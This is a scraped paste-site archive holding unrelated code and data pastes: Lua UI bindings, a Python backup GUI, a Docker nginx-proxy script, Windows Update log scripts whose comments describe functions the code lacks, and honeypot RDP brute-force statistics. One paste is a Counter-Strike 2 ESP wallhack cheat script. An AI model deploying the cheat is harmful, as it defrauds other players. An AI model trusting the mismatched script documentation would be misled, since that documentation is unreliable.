Window:AddBind({text = ""Bind"", flag = ""bind"", key = ""MouseButton1"", callback = function() print""pressed"" end}) --key can also be Enum.UserInputType.MouseButton1, instead of the name/string
Window:AddBind({text = ""Bind"", flag = ""bind"", hold = true, key = ""E"" , callback = function(a) if a then print""let go"" else print""holding"" end end}) --key can also be Enum.KeyCode.E, instead of the name/string
--Window:AddBind({text = ""Toggle UI"", key = ""RightShift"", callback = function() library:Close() end})
 
--Color Picker
Window:AddColor({text = ""Color"", flag = ""color"", color = Color3.fromRGB(255, 65, 65), callback = function(a) print(a) end})
Window:AddColor({text = ""Color"", flag = ""color"", color = {1, 0.2, 0.2}, callback = function(a) print(a) end})
--Uses a table instead of a color value (each value has to range from 0 to 1, think of it as using Color3.new), useful for loading json encoded options from a save file
 
--Initialize the library, so everything will get created
Library:Init()
 
wait(5)
print(""Toggle is currently:"", Library.flags[""toggle""])
print(""Second toggle is currently:"", Library.flags[""toggle1""])
--Flags can be useful for a lot of stuff, get creative with them :)
--You can also get the value/state/key from each option if they're defined"
336DzwTx,Backup de Arquivos JPG e PNG ver. 4,MizunoBrasil,Python,Thursday 2nd of May 2024 10:06:29 PM CDT,"import tkinter as tk
from tkinter import filedialog, messagebox
import os
import shutil
import threading
import win32gui
import win32con

def esconder_janela_terminal():
    janela_terminal = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(janela_terminal, win32con.SW_MINIMIZE)

def copiar_arquivos(origem, destino, tipos_arquivos):
    esconder_janela_terminal()
    
    if not origem:
        return
    
    if not os.path.exists(destino):
        os.makedirs(destino)
    
    def copiar():
        for arquivo in os.listdir(origem):
            caminho_arquivo = os.path.join(origem, arquivo)
            if os.path.isfile(caminho_arquivo):  # Verifica se é um arquivo
                if tipos_arquivos == ""Imagens"" and (arquivo.endswith("".jpg"") or arquivo.endswith("".png"") or arquivo.endswith("".webp"")):
                    copiar_arquivo(caminho_arquivo, destino)
                elif tipos_arquivos == ""Vídeos"" and (arquivo.endswith("".mp4"") or arquivo.endswith("".avi"") or arquivo.endswith("".mkv"") or arquivo.endswith("".webm"") or arquivo.endswith("".mov"")):
                    copiar_arquivo(caminho_arquivo, destino)
                elif tipos_arquivos == ""Todos"":
                    copiar_arquivo(caminho_arquivo, destino)
                        
        messagebox.showinfo(""Sucesso"", ""Os arquivos foram copiados com sucesso."")
    
    thread = threading.Thread(target=copiar)
    thread.start()

def copiar_arquivo(origem, destino):
    shutil.copy(origem, destino)

def selecionar_destino():
    destino = filedialog.askdirectory(title=""Selecione a pasta de destino"")
    if destino:
        salvar_caminho(destino)
        texto_caminho.config(text=""Caminho de Destino: "" + destino)

def copiar_usando_caminho_salvo():
    caminho_destino = carregar_caminho()
    origem = filedialog.askdirectory(title=""Selecione a pasta de origem"")
    if origem:
        tipos_arquivos = var_tipo_arquivos.get()
        copiar_arquivos(origem, caminho_destino, tipos_arquivos)

def salvar_caminho(caminho):
    with open(""caminho_destino.txt"", ""w"") as arquivo:
        arquivo.write(caminho)

def carregar_caminho():
    if os.path.exists(""caminho_destino.txt""):
        with open(""caminho_destino.txt"", ""r"") as arquivo:
            return arquivo.read().strip()
    return """"

def abrir_explorador():
    caminho = carregar_caminho()
    if not caminho or not os.path.exists(caminho):
        caminho = os.getcwd()  # Diretório atual
    os.startfile(caminho)

janela = tk.Tk()
janela.title(""Backup de Arquivos - ver.4"")

largura = 400
altura = 300
largura_tela = janela.winfo_screenwidth()
altura_tela = janela.winfo_screenheight()
x = (largura_tela/2) - (largura/2)
y = (altura_tela/2) - (altura/2)
janela.geometry('%dx%d+%d+%d' % (largura, altura, x, y))

botao_destino = tk.Button(janela, text=""Selecionar Destino"", command=selecionar_destino)
botao_destino.pack(pady=10)

var_tipo_arquivos = tk.StringVar()
var_tipo_arquivos.set(""Todos"")

frame_tipos_arquivos = tk.LabelFrame(janela, text=""Tipos de Arquivos"")
frame_tipos_arquivos.pack(pady=10)

tk.Radiobutton(frame_tipos_arquivos, text=""Imagens"", variable=var_tipo_arquivos, value=""Imagens"").pack(anchor=tk.W)
tk.Radiobutton(frame_tipos_arquivos, text=""Vídeos"", variable=var_tipo_arquivos, value=""Vídeos"").pack(anchor=tk.W)
tk.Radiobutton(frame_tipos_arquivos, text=""Todos"", variable=var_tipo_arquivos, value=""Todos"").pack(anchor=tk.W)

botao_copiar = tk.Button(janela, text=""Selecionar pasta de origem"", command=copiar_usando_caminho_salvo)
botao_copiar.pack(pady=10)

botao_info = tk.Button(janela, text=""Abrir pasta de Destino"", command=abrir_explorador, justify=tk.LEFT, fg=""blue"", cursor=""hand2"")
botao_info.pack(pady=10)

texto_caminho = tk.Label(janela, text=""Caminho de Destino: "" + carregar_caminho(), justify=tk.LEFT)
texto_caminho.pack(pady=10)

janela.mainloop()
"
dDJnsk7h,Aimware.net CS2 v5.1 Skibidi Sigma Rizz ESP,Dr_Coomer,Lua,Thursday 2nd of May 2024 08:22:27 PM CDT,"local svgData = http.Get(""https://upload.wikimedia.org/wikipedia/commons/e/e7/Greek_uc_sigma.svg"");

local imgRGBA, imgWidth, imgHeight = common.RasterizeSVG(svgData);

local texture = draw.CreateTexture(imgRGBA, imgWidth, imgHeight);

local function DistanceFrom(vec1, vec2) 
    return math.sqrt((vec2.x - vec1.x) ^ 2 + (vec2.y - vec1.y) ^ 2)
end

callbacks.Register(""Draw"", function()
    local plocal = entities.GetLocalPlayer()
    if not plocal then return end

    draw.SetTexture(texture);

    local players = entities.FindByClass(""C_CSPlayerPawn"")

    for i = 1, #players do
        local player = players[i]
        if player:GetName() == ""C_CSGO_PreviewPlayer"" then goto continue end
        if player:GetIndex() == plocal:GetIndex() then goto continue end
        if not player:IsAlive() then goto continue end
        if player:GetTeamNumber() == plocal:GetTeamNumber() then goto continue end

        local playerAbs1 = player:GetAbsOrigin()
        local playerAbs2 = player:GetAbsOrigin()

        local distance = DistanceFrom(plocal:GetAbsOrigin(), playerAbs2)

        playerAbs1.z = playerAbs1.z + 70

        local x1, y1 = client.WorldToScreen(playerAbs1)
        local x2, y2 = client.WorldToScreen(playerAbs2)

        if x1 ~= nil and y1 ~= nil then
            --draw.Color(255, 255, 255, 255)
            --draw.FilledCircle(x1 - (15000/distance), y1, 5)
            --draw.FilledCircle(x2 + (15000/distance), y2, 5)
            --Got the math from here: https://www.unknowncheats.me/forum/c-and-c-/76713-esp-box-size-calculation.html
            draw.FilledRect(x1 - (15000/distance), y1 - (900/distance), x2 + (15000/distance), y2 + (900/distance))
        end

        ::continue::
    end
end)"
bkceUS9Q,nginx-proxy-deployer.sh,Sergio_Istea,Bash,Thursday 2nd of May 2024 07:57:38 PM CDT,"#!/bin/bash

# Instalar docker
#

apt update && apt install docker.io -y


# Añadir usario a grupo docker
#
#

gpasswd -a $USER docker

# Crear red

docker network create nginx-proxy

# Desplegar nginx
#

docker run -d -p 80:80 \
--restart=always \
--name nginx-proxy \
-v /var/run/docker.sock:/tmp/docker.sock:ro \
--network nginx-proxy \
jwilder/nginx-proxy


# apache2 test
#
docker run -d \
--restart=always \
--name apache2-proxy \
--network nginx-proxy \
-e VIRTUAL_HOST=nginx-proxy.test \
ubuntu/apache2


# final
#
echo ""
acceso http://nginx-proxy.test
""
"
rukLDs1V,py_get_windows_update_logs,Python253,Python,Thursday 2nd of May 2024 07:37:03 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: py_get_windows_update_logs.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script retrieves Windows Update logs and saves them to separate files: one containing verbose information saved on the desktop, and the other containing ETL (Event Trace Log) data saved in the current working directory.

Requirements:
- Python 3.x
- PowerShell

Usage:
1. Run the script using Python 3.x.
2. The script will execute PowerShell commands to retrieve Windows Update logs.
3. Verbose logs will be saved as 'windows_update_verbose.log' on the desktop.
4. ETL logs will be saved as 'windows_update_etl.log' in the current working directory.

Functions:
- main(): Executes the script, retrieves Windows Update logs, and saves them to separate files.
- save_verbose_log(): Saves verbose logs to 'windows_update_verbose.log' on the desktop.
- save_etl_log(): Saves ETL logs to 'windows_update_etl.log' in the current working directory.

Additional Notes:
- Running this script requires administrative privileges as it executes PowerShell commands.
- Ensure that PowerShell is installed and accessible from the command line.
- The script may take some time to complete, depending on the size of the Windows Update logs.
""""""

import subprocess
import os

# Define the path to save the ETL log in the current working directory
etl_log_path = os.path.join(os.getcwd(), ""windows_update_etl.log"")

# Inform the user about the logging process
print(""Creating Windows Update logs...                      "")
print(""-----------------------------------------------------"")
print(""Creating Verbose log on the Desktop...               "")
print(""Creating ETL log in the Current Working Directory... "")
print(""-----------------------------------------------------"")
print(""This may take some time. Thank you for your patience."")
print(""-----------------------------------------------------"")
print()

# Run the PowerShell cmdlet to get the Windows Update ETL logs and write directly to the ETL log file
try:
    with open(etl_log_path, ""w"") as etl_file:
        subprocess.run([""powershell.exe"", ""-Command"", ""get-windowsUpdateLog""], stdout=etl_file, check=True)
    print(f""Windows Update ETL logs successfully retrieved and saved to: {etl_log_path}"")
except subprocess.CalledProcessError:
    print(""Failed to retrieve Windows Update ETL logs."")

# Prompt the user to hit enter to exit
input(""Press Enter to exit..."")

"
c0CFXQ7y,bash_get_windows_update_logs,Python253,Bash,Thursday 2nd of May 2024 07:36:35 PM CDT,"#!/bin/bash

# Author: Jeoi Reqi
# Filename: bash_get_windows_update_logs.sh
# Version: 1.0.0
#
# Description: 
#   This script retrieves Windows Update logs and saves them to separate files:
#   one containing verbose information saved on the desktop, and the other containing 
#   ETL (Event Trace Log) data saved in the current working directory.
# 
# Requirements:
#   - Python 3.x
#   - PowerShell
# 
# Usage:
#   1. Run the script using Python 3.x.
#   2. The script will execute PowerShell commands to retrieve Windows Update logs.
#   3. Verbose logs will be saved as 'windows_update_verbose.log' on the desktop.
#   4. ETL logs will be saved as 'windows_update_etl.log' in the current working directory.
# 
# Functions:
#   - main(): Executes the script, retrieves Windows Update logs, and saves them to separate files.
#   - save_verbose_log(): Saves verbose logs to 'windows_update_verbose.log' on the desktop.
#   - save_etl_log(): Saves ETL logs to 'windows_update_etl.log' in the current working directory.
# 
# Additional Notes:
#   - Running this script requires administrative privileges as it executes PowerShell commands.
#   - Ensure that PowerShell is installed and accessible from the command line.
#   - The script may take some time to complete, depending on the size of the Windows Update logs.

# Define the path to save the ETL log in the current working directory
ETL_LOG_PATH=""$(pwd)/windows_update_etl.log""

# Inform the user about the logging process
echo ""Creating Windows Update logs...                      ""
echo ""-----------------------------------------------------""
echo ""Creating Verbose log on the Desktop...               ""
echo ""Creating ETL log in the Current Working Directory... "" 
echo ""-----------------------------------------------------""
echo ""This may take some time. Thank you for your patience.""
echo ""-----------------------------------------------------""
echo

# Run the PowerShell cmdlet to get the Windows Update ETL logs and write directly to the ETL log file
powershell.exe -Command ""get-windowsUpdateLog"" > ""$ETL_LOG_PATH""

# Check if the PowerShell command executed successfully for the ETL log
if [ $? -eq 0 ]; then
    echo ""Windows Update ETL logs successfully retrieved and saved to: $ETL_LOG_PATH""
else
    echo ""Failed to retrieve Windows Update ETL logs.""
fi

# Prompt the user to hit enter to exit
read -rp ""Press Enter to exit...""

"
R3vnDxrv,Image Carousel (Novely),AhmadXploit,Dart,Thursday 2nd of May 2024 07:27:36 PM CDT,"[
        ""https://i.ibb.co/rfJRRtF/images.jpg"",
        ""https://i.ibb.co/wz4yH8r/images-1.jpg"",
        ""https://i.ibb.co/61ycmLz/images-2.jpg"",
        ""https://i.ibb.co/XpptsSp/images-4.jpg"",
        ""https://i.ibb.co/8rd6P1j/images-3.jpg""
]"
Sd1nD4yk,2024-05-02_stats.json,rdp_snitch,JSON,Thursday 2nd of May 2024 07:18:11 PM CDT,"{
  ""ip"": {
    ""58.218.204.183"": 9,
    ""157.119.251.94"": 3,
    ""152.32.183.213"": 282,
    ""137.184.3.0"": 30,
    ""205.210.31.234"": 9,
    ""81.19.135.2"": 9,
    ""194.165.16.11"": 6,
    ""194.165.16.76"": 6,
    ""128.199.193.14"": 3,
    ""87.251.75.145"": 9,
    ""87.251.75.120"": 6,
    ""185.170.144.3"": 6,
    ""103.119.3.25"": 3,
    ""197.242.158.64"": 6,
    ""198.235.24.208"": 9,
    ""165.154.128.17"": 3,
    ""36.91.222.100"": 6,
    ""123.56.20.194"": 21,
    ""172.233.84.194"": 2058,
    ""159.65.82.237"": 45,
    ""2.57.149.186"": 12,
    ""172.104.169.86"": 153,
    ""167.94.145.101"": 3,
    ""62.234.185.85"": 153,
    ""198.235.24.118"": 9,
    ""185.161.248.121"": 12,
    ""27.8.44.19"": 3,
    ""87.251.75.64"": 3,
    ""159.223.172.50"": 12,
    ""138.68.31.5"": 3,
    ""45.227.254.54"": 6,
    ""138.199.40.231"": 165,
    ""87.251.75.179"": 6,
    ""64.124.50.139"": 3,
    ""194.165.16.10"": 6,
    ""112.4.139.162"": 3,
    ""43.239.251.85"": 3,
    ""14.241.97.160"": 3,
    ""202.123.26.146"": 18,
    ""116.140.196.215"": 3,
    ""198.235.24.105"": 9,
    ""80.66.76.134"": 3,
    ""139.162.54.214"": 2058
  },
  ""asn"": {
    ""AS4134"": 9,
    ""AS135944"": 3,
    ""AS135377"": 285,
    ""AS14061"": 93,
    ""AS396982"": 36,
    ""AS209588"": 9,
    ""AS48721"": 18,
    ""AS208091"": 27,
    ""AS197414"": 6,
    ""AS138968"": 3,
    ""AS37611"": 6,
    ""AS7713"": 6,
    ""AS37963"": 21,
    ""AS63949"": 4269,
    ""AS208312"": 12,
    ""AS398705"": 3,
    ""AS45090"": 153,
    ""AS49202"": 12,
    ""AS4837"": 6,
    ""AS267784"": 6,
    ""AS60068"": 165,
    ""AS6461"": 3,
    ""AS56046"": 3,
    ""AS58955"": 3,
    ""AS45899"": 3,
    ""AS23889"": 18
  },
  ""isp"": {
    ""Chinanet"": 9,
    ""VinhNam Commercial informatics service corporation"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 285,
    ""DigitalOcean, LLC"": 93,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 33,
    ""Xhost Internet Solutions LP"": 33,
    ""China Internet Network Information Center"": 3,
    ""Afrihost (Pty) Ltd"": 6,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Hangzhou Alibaba Advertising Co"": 21,
    ""Akamai Technologies, Inc."": 4116,
    ""Red Byte LLC"": 12,
    ""Akamai Technologies"": 153,
    ""Censys, Inc."": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 153,
    ""Kisara LLC"": 12,
    ""China Unicom Chongqing Province Network"": 3,
    ""Datacamp Limited"": 165,
    ""Zayo Bandwidth"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Bangmod Enterprise Co., Ltd."": 3,
    ""VNPT"": 3,
    ""MauritiusTelecom"": 18,
    ""China Unicom CHINA169 Network"": 3
  },
  ""org"": {
    ""Chinanet JS"": 9,
    ""VINACIS"": 3,
    ""Ucloud Information Technology"": 282,
    ""DigitalOcean, LLC"": 93,
    ""Palo Alto Networks, Inc"": 36,
    ""Alviva Holding Limited"": 9,
    ""Flyservers S.A"": 18,
    ""Xhost Internet Solutions"": 27,
    ""Xhostis"": 6,
    ""Sakura Network Limited"": 3,
    ""Unknown"": 9,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Telekomunikasi Indonesia"": 6,
    ""Aliyun Computing Co., LTD"": 21,
    ""Akamai Technologies, Inc."": 2058,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Linode"": 153,
    ""Censys, Inc."": 3,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 153,
    ""Kisara LLC"": 12,
    ""UAB Host Baltic"": 6,
    ""Cdn77 NYC"": 165,
    ""Microsoft Corporation"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Bangmod Enterprise Co., Ltd."": 3,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""State Informatics LTD"": 18,
    ""China United Network Communications Corporation Limited"": 3,
    ""Linode, LLC"": 2058
  },
  ""regionName"": {
    ""Jiangsu"": 12,
    ""Ho Chi Minh"": 3,
    ""Virginia"": 285,
    ""California"": 69,
    ""Hesse"": 12,
    ""Kaunas"": 18,
    ""South West"": 3,
    ""North Holland"": 33,
    ""Tokyo"": 3,
    ""Gauteng"": 6,
    ""England"": 48,
    ""Jakarta"": 6,
    ""Beijing"": 177,
    ""\u014csaka"": 2058,
    ""Lesser Poland"": 12,
    ""North West"": 153,
    ""Moscow"": 12,
    ""Chongqing"": 3,
    ""New Jersey"": 12,
    ""Vilnius"": 6,
    ""New York"": 165,
    ""Bangkok"": 3,
    ""Hanoi"": 3,
    ""Port Louis District"": 18,
    ""Central Singapore"": 2058
  },
  ""country"": {
    ""China"": 192,
    ""Vietnam"": 6,
    ""United States"": 531,
    ""Germany"": 12,
    ""Lithuania"": 24,
    ""Singapore"": 2214,
    ""The Netherlands"": 33,
    ""Japan"": 2061,
    ""South Africa"": 6,
    ""United Kingdom"": 48,
    ""Indonesia"": 6,
    ""Poland"": 12,
    ""Russia"": 12,
    ""Thailand"": 3,
    ""Mauritius"": 18
  },
  ""account"": {
    ""hello"": 459,
    ""Administrator"": 633,
    ""Admin"": 630,
    ""Whatuptime.com"": 627,
    ""Jakartakini123#"": 630,
    ""Hello World"": 630,
    ""TinHocThucHanh"": 624,
    ""Hey"": 627,
    ""QXIovyKhm"": 3,
    ""joUXtI"": 3,
    ""jBPcgH"": 3,
    ""Domain"": 15,
    ""Test"": 42,
    ""Administr"": 48,
    ""exuVGhUtD"": 3,
    ""KVrwdf"": 3,
    ""YJdBFE"": 3,
    ""administrator"": 51,
    ""admin"": 51,
    ""whatuptile.com"": 42,
    ""(empty)"": 9,
    ""whatuptime.com"": 9,
    ""MEWDTnjEo"": 3,
    ""XcBZuV"": 3,
    ""XLyiOX"": 3,
    ""uws7pdsq"": 12,
    ""beio"": 3,
    ""ZKtxvjlwa"": 3,
    ""YObuBg"": 3,
    ""TFZpqT"": 3
  },
  ""keyboard"": {
    ""Unknown"": 5178
  },
  ""client_build"": {
    ""Unknown"": 5178
  },
  ""client_name"": {
    ""Unknown"": 5178
  },
  ""ip_type"": {
    ""proxy"": 12,
    ""hosting"": 4821,
    ""Unknown"": 288,
    ""hosting & proxy"": 51,
    ""mobile"": 6
  }
}"
T2imUZkV,2024-05-02_stats.json,rdp_snitch,JSON,Thursday 2nd of May 2024 07:16:10 PM CDT,"{
  ""ip"": {
    ""58.218.204.183"": 6,
    ""157.119.251.94"": 2,
    ""152.32.183.213"": 188,
    ""137.184.3.0"": 20,
    ""205.210.31.234"": 6,
    ""81.19.135.2"": 6,
    ""194.165.16.11"": 4,
    ""194.165.16.76"": 4,
    ""128.199.193.14"": 2,
    ""87.251.75.145"": 6,
    ""87.251.75.120"": 4,
    ""185.170.144.3"": 4,
    ""103.119.3.25"": 2,
    ""197.242.158.64"": 4,
    ""198.235.24.208"": 6,
    ""165.154.128.17"": 2,
    ""36.91.222.100"": 4,
    ""123.56.20.194"": 14,
    ""172.233.84.194"": 1372,
    ""159.65.82.237"": 30,
    ""2.57.149.186"": 8,
    ""172.104.169.86"": 102,
    ""167.94.145.101"": 2,
    ""62.234.185.85"": 102,
    ""198.235.24.118"": 6,
    ""185.161.248.121"": 8,
    ""27.8.44.19"": 2,
    ""87.251.75.64"": 2,
    ""159.223.172.50"": 8,
    ""138.68.31.5"": 2,
    ""45.227.254.54"": 4,
    ""138.199.40.231"": 110,
    ""87.251.75.179"": 4,
    ""64.124.50.139"": 2,
    ""194.165.16.10"": 4,
    ""112.4.139.162"": 2,
    ""43.239.251.85"": 2,
    ""14.241.97.160"": 2,
    ""202.123.26.146"": 12,
    ""116.140.196.215"": 2,
    ""198.235.24.105"": 6,
    ""80.66.76.134"": 2,
    ""139.162.54.214"": 1372
  },
  ""asn"": {
    ""AS4134"": 6,
    ""AS135944"": 2,
    ""AS135377"": 190,
    ""AS14061"": 62,
    ""AS396982"": 24,
    ""AS209588"": 6,
    ""AS48721"": 12,
    ""AS208091"": 18,
    ""AS197414"": 4,
    ""AS138968"": 2,
    ""AS37611"": 4,
    ""AS7713"": 4,
    ""AS37963"": 14,
    ""AS63949"": 2846,
    ""AS208312"": 8,
    ""AS398705"": 2,
    ""AS45090"": 102,
    ""AS49202"": 8,
    ""AS4837"": 4,
    ""AS267784"": 4,
    ""AS60068"": 110,
    ""AS6461"": 2,
    ""AS56046"": 2,
    ""AS58955"": 2,
    ""AS45899"": 2,
    ""AS23889"": 12
  },
  ""isp"": {
    ""Chinanet"": 6,
    ""VinhNam Commercial informatics service corporation"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 190,
    ""DigitalOcean, LLC"": 62,
    ""Google LLC"": 24,
    ""Flyservers S.A."": 22,
    ""Xhost Internet Solutions LP"": 22,
    ""China Internet Network Information Center"": 2,
    ""Afrihost (Pty) Ltd"": 4,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Hangzhou Alibaba Advertising Co"": 14,
    ""Akamai Technologies, Inc."": 2744,
    ""Red Byte LLC"": 8,
    ""Akamai Technologies"": 102,
    ""Censys, Inc."": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 102,
    ""Kisara LLC"": 8,
    ""China Unicom Chongqing Province Network"": 2,
    ""Datacamp Limited"": 110,
    ""Zayo Bandwidth"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Bangmod Enterprise Co., Ltd."": 2,
    ""VNPT"": 2,
    ""MauritiusTelecom"": 12,
    ""China Unicom CHINA169 Network"": 2
  },
  ""org"": {
    ""Chinanet JS"": 6,
    ""VINACIS"": 2,
    ""Ucloud Information Technology"": 188,
    ""DigitalOcean, LLC"": 62,
    ""Palo Alto Networks, Inc"": 24,
    ""Alviva Holding Limited"": 6,
    ""Flyservers S.A"": 12,
    ""Xhost Internet Solutions"": 18,
    ""Xhostis"": 4,
    ""Sakura Network Limited"": 2,
    ""Unknown"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Telekomunikasi Indonesia"": 4,
    ""Aliyun Computing Co., LTD"": 14,
    ""Akamai Technologies, Inc."": 1372,
    ""Chang Way Technologies Co. Limited"": 8,
    ""Linode"": 102,
    ""Censys, Inc."": 2,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 102,
    ""Kisara LLC"": 8,
    ""UAB Host Baltic"": 4,
    ""Cdn77 NYC"": 110,
    ""Microsoft Corporation"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Bangmod Enterprise Co., Ltd."": 2,
    ""Vietnam Posts and Telecommunications Group"": 2,
    ""State Informatics LTD"": 12,
    ""China United Network Communications Corporation Limited"": 2,
    ""Linode, LLC"": 1372
  },
  ""regionName"": {
    ""Jiangsu"": 8,
    ""Ho Chi Minh"": 2,
    ""Virginia"": 190,
    ""California"": 46,
    ""Hesse"": 8,
    ""Kaunas"": 12,
    ""South West"": 2,
    ""North Holland"": 22,
    ""Tokyo"": 2,
    ""Gauteng"": 4,
    ""England"": 32,
    ""Jakarta"": 4,
    ""Beijing"": 118,
    ""\u014csaka"": 1372,
    ""Lesser Poland"": 8,
    ""North West"": 102,
    ""Moscow"": 8,
    ""Chongqing"": 2,
    ""New Jersey"": 8,
    ""Vilnius"": 4,
    ""New York"": 110,
    ""Bangkok"": 2,
    ""Hanoi"": 2,
    ""Port Louis District"": 12,
    ""Central Singapore"": 1372
  },
  ""country"": {
    ""China"": 128,
    ""Vietnam"": 4,
    ""United States"": 354,
    ""Germany"": 8,
    ""Lithuania"": 16,
    ""Singapore"": 1476,
    ""The Netherlands"": 22,
    ""Japan"": 1374,
    ""South Africa"": 4,
    ""United Kingdom"": 32,
    ""Indonesia"": 4,
    ""Poland"": 8,
    ""Russia"": 8,
    ""Thailand"": 2,
    ""Mauritius"": 12
  },
  ""account"": {
    ""hello"": 306,
    ""Administrator"": 422,
    ""Admin"": 420,
    ""Whatuptime.com"": 418,
    ""Jakartakini123#"": 420,
    ""Hello World"": 420,
    ""TinHocThucHanh"": 416,
    ""Hey"": 418,
    ""QXIovyKhm"": 2,
    ""joUXtI"": 2,
    ""jBPcgH"": 2,
    ""Domain"": 10,
    ""Test"": 28,
    ""Administr"": 32,
    ""exuVGhUtD"": 2,
    ""KVrwdf"": 2,
    ""YJdBFE"": 2,
    ""administrator"": 34,
    ""admin"": 34,
    ""whatuptile.com"": 28,
    ""(empty)"": 6,
    ""whatuptime.com"": 6,
    ""MEWDTnjEo"": 2,
    ""XcBZuV"": 2,
    ""XLyiOX"": 2,
    ""uws7pdsq"": 8,
    ""beio"": 2,
    ""ZKtxvjlwa"": 2,
    ""YObuBg"": 2,
    ""TFZpqT"": 2
  },
  ""keyboard"": {
    ""Unknown"": 3452
  },
  ""client_build"": {
    ""Unknown"": 3452
  },
  ""client_name"": {
    ""Unknown"": 3452
  },
  ""ip_type"": {
    ""proxy"": 8,
    ""hosting"": 3214,
    ""Unknown"": 192,
    ""hosting & proxy"": 34,
    ""mobile"": 4
  }
}"
tbVVbwiE,2024-05-02_stats.json,rdp_snitch,JSON,Thursday 2nd of May 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""58.218.204.183"": 3,
    ""157.119.251.94"": 1,
    ""152.32.183.213"": 94,
    ""137.184.3.0"": 10,
    ""205.210.31.234"": 3,
    ""81.19.135.2"": 3,
    ""194.165.16.11"": 2,
    ""194.165.16.76"": 2,
    ""128.199.193.14"": 1,
    ""87.251.75.145"": 3,
    ""87.251.75.120"": 2,
    ""185.170.144.3"": 2,
    ""103.119.3.25"": 1,
    ""197.242.158.64"": 2,
    ""198.235.24.208"": 3,
    ""165.154.128.17"": 1,
    ""36.91.222.100"": 2,
    ""123.56.20.194"": 7,
    ""172.233.84.194"": 686,
    ""159.65.82.237"": 15,
    ""2.57.149.186"": 4,
    ""172.104.169.86"": 51,
    ""167.94.145.101"": 1,
    ""62.234.185.85"": 51,
    ""198.235.24.118"": 3,
    ""185.161.248.121"": 4,
    ""27.8.44.19"": 1,
    ""87.251.75.64"": 1,
    ""159.223.172.50"": 4,
    ""138.68.31.5"": 1,
    ""45.227.254.54"": 2,
    ""138.199.40.231"": 55,
    ""87.251.75.179"": 2,
    ""64.124.50.139"": 1,
    ""194.165.16.10"": 2,
    ""112.4.139.162"": 1,
    ""43.239.251.85"": 1,
    ""14.241.97.160"": 1,
    ""202.123.26.146"": 6,
    ""116.140.196.215"": 1,
    ""198.235.24.105"": 3,
    ""80.66.76.134"": 1,
    ""139.162.54.214"": 686
  },
  ""asn"": {
    ""AS4134"": 3,
    ""AS135944"": 1,
    ""AS135377"": 95,
    ""AS14061"": 31,
    ""AS396982"": 12,
    ""AS209588"": 3,
    ""AS48721"": 6,
    ""AS208091"": 9,
    ""AS197414"": 2,
    ""AS138968"": 1,
    ""AS37611"": 2,
    ""AS7713"": 2,
    ""AS37963"": 7,
    ""AS63949"": 1423,
    ""AS208312"": 4,
    ""AS398705"": 1,
    ""AS45090"": 51,
    ""AS49202"": 4,
    ""AS4837"": 2,
    ""AS267784"": 2,
    ""AS60068"": 55,
    ""AS6461"": 1,
    ""AS56046"": 1,
    ""AS58955"": 1,
    ""AS45899"": 1,
    ""AS23889"": 6
  },
  ""isp"": {
    ""Chinanet"": 3,
    ""VinhNam Commercial informatics service corporation"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 95,
    ""DigitalOcean, LLC"": 31,
    ""Google LLC"": 12,
    ""Flyservers S.A."": 11,
    ""Xhost Internet Solutions LP"": 11,
    ""China Internet Network Information Center"": 1,
    ""Afrihost (Pty) Ltd"": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Hangzhou Alibaba Advertising Co"": 7,
    ""Akamai Technologies, Inc."": 1372,
    ""Red Byte LLC"": 4,
    ""Akamai Technologies"": 51,
    ""Censys, Inc."": 1,
    ""Shenzhen Tencent Computer Systems Company Limited"": 51,
    ""Kisara LLC"": 4,
    ""China Unicom Chongqing Province Network"": 1,
    ""Datacamp Limited"": 55,
    ""Zayo Bandwidth"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Bangmod Enterprise Co., Ltd."": 1,
    ""VNPT"": 1,
    ""MauritiusTelecom"": 6,
    ""China Unicom CHINA169 Network"": 1
  },
  ""org"": {
    ""Chinanet JS"": 3,
    ""VINACIS"": 1,
    ""Ucloud Information Technology"": 94,
    ""DigitalOcean, LLC"": 31,
    ""Palo Alto Networks, Inc"": 12,
    ""Alviva Holding Limited"": 3,
    ""Flyservers S.A"": 6,
    ""Xhost Internet Solutions"": 9,
    ""Xhostis"": 2,
    ""Sakura Network Limited"": 1,
    ""Unknown"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Telekomunikasi Indonesia"": 2,
    ""Aliyun Computing Co., LTD"": 7,
    ""Akamai Technologies, Inc."": 686,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Linode"": 51,
    ""Censys, Inc."": 1,
    ""Tencent Cloud Computing (Beijing) Co., Ltd"": 51,
    ""Kisara LLC"": 4,
    ""UAB Host Baltic"": 2,
    ""Cdn77 NYC"": 55,
    ""Microsoft Corporation"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Bangmod Enterprise Co., Ltd."": 1,
    ""Vietnam Posts and Telecommunications Group"": 1,
    ""State Informatics LTD"": 6,
    ""China United Network Communications Corporation Limited"": 1,
    ""Linode, LLC"": 686
  },
  ""regionName"": {
    ""Jiangsu"": 4,
    ""Ho Chi Minh"": 1,
    ""Virginia"": 95,
    ""California"": 23,
    ""Hesse"": 4,
    ""Kaunas"": 6,
    ""South West"": 1,
    ""North Holland"": 11,
    ""Tokyo"": 1,
    ""Gauteng"": 2,
    ""England"": 16,
